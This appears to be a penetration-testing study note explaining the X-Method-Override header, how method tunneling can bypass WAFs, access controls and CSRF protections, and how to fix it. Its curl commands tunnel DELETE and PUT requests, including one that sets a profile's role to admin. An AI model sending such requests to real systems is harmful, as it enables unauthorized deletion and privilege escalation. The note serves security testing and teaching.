---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.23 X-Method-Override — Method Tunneling"
---

# 03.23 — X-Method-Override

## What is it?

`X-Method-Override` is a non-standard HTTP header used to bypass limitations in web clients, proxies, or firewalls that do not support or block specific HTTP methods (such as `PUT`, `DELETE`, `PATCH`, `TRACE`, or `OPTIONS`). 

For security or compatibility reasons, many HTML forms and older web clients only natively support sending `GET` and `POST` requests. To build a modern RESTful API that requires methods like `PUT` or `DELETE`, developers implement **Method Tunneling**. In this approach, the client sends a `POST` request, but adds a header like `X-Method-Override: DELETE` to instruct the backend framework to process the request as a `DELETE` operation instead of a `POST`.

While method tunneling is a useful compatibility feature, it introduces security risks if firewalls or intrusion prevention systems only inspect the outer HTTP request method (`POST`) and allow it, while the backend application parses the inner overridden method (`DELETE` or `PUT`) and performs highly privileged operations.

---

## Use Cases

### 1. Bypassing Web Application Firewall (WAF) Method Restrictions
Many WAFs are configured to block inbound `DELETE` or `PUT` requests to mitigate unauthorized resource deletion or modification. By sending a request using the `POST` method (which is typically allowed) and including `X-Method-Override: DELETE`, attackers can tunnel the restricted action past the WAF. If the backend server executes the overridden method without performing independent method-level validation, the block is completely bypassed.

### 2. Access Control and Privilege Bypass in Framework Routing
Some administrative endpoints might restrict access based on the request method. For example, a route `/api/users/1` might allow anyone to perform a `GET` request, but only admins can issue a `DELETE` request. If the authorization checks are applied at the proxy level based solely on the raw HTTP method of the request line, the proxy sees a safe method, while the application framework processes the overridden method and executes the destructive administrative action.

### 3. Exploiting Cross-Site Request Forgery (CSRF) via Method Override
Modern browsers restrict standard HTML forms from sending `PUT` or `DELETE` requests directly. However, an attacker can construct an exploit using a standard HTML form targeting a vulnerable application that honors `X-Method-Override` or body-based method parameters. The form sends a POST request with the override, allowing the attacker to trigger state-changing PUT/DELETE actions through CSRF.

---

## Commands

Test for method override vulnerabilities using curl or automated scripts.

### 1. Tunneling a DELETE Request
Send a POST request to a resource endpoint while attempting to execute a deletion via the `X-Method-Override` header:
```bash
curl -i -X POST https://target.local/api/v1/posts/42 \
     -H "X-Method-Override: DELETE" \
     -H "Content-Type: application/json" \
     -d '{"confirm": "true"}'
```

### 2. Tunneling a PUT Request to Update Data
Attempt to perform an unauthorized modification on a profile record:
```bash
curl -i -X POST https://target.local/api/users/profile \
     -H "X-Method-Override: PUT" \
     -H "Content-Type: application/json" \
     -d '{"email": "attacker@evil.local", "role": "admin"}'
```

### 3. Testing Various Override Headers Simultaneously
A command string to check if the backend application accepts different variations of the method override header:
```bash
curl -i -X POST https://target.local/api/items \
     -H "X-Method-Override: PUT" \
     -H "X-HTTP-Method-Override: PUT" \
     -H "X-HTTP-Method: PUT" \
     -d '{"item_id": 5}'
```

---

## Sample Output

### Vulnerable Response (Successful Method Override)
The backend application accepts the `X-Method-Override: DELETE` header and deletes the resource, returning a `200 OK` (or `204 No Content`) along with confirmation.
```http
HTTP/1.1 200 OK
Date: Tue, 16 Jun 2026 10:33:00 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 68
Connection: keep-alive
Server: Apache/2.4.41 (Ubuntu)

{"status": "success", "message": "Resource successfully deleted."}
```

### Secure Response (Method Override Rejected or Blocked)
The server ignores the header or rejects the invalid method combination, returning an error.
```http
HTTP/1.1 405 Method Not Allowed
Date: Tue, 16 Jun 2026 10:33:00 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 73
Connection: close
Allow: GET, HEAD

{"error": "Method Not Allowed", "message": "POST is not supported on this resource."}
```

---

## How to Fix / Secure

To mitigate method override security vulnerabilities:

| Risk | Fix / Mitigation |
|------|------------------|
| **WAF Bypasses via Tunneling** | Ensure WAFs and API Gateways are configured to inspect custom method override headers (`X-Method-Override`, `X-HTTP-Method-Override`, `X-HTTP-Method`) and block them if they override to restricted methods. |
| **Weak Framework Configurations** | Disable method override parsing in the application framework (e.g., Express, Rails, Spring) if the clients are modern web browsers or API consumers that natively support standard REST methods. |
| **Insufficient Backend Authorization** | Implement robust authorization logic that checks user privileges against the *resolved* HTTP method inside the application routing logic. |

---

## Related Notes
- [[22 - X-HTTP-Method-Override]] — primary override header  
- [[24 - _method POST body]] — body parameter version
- [[02.06 - HTTP Methods]] — HTTP methods and security
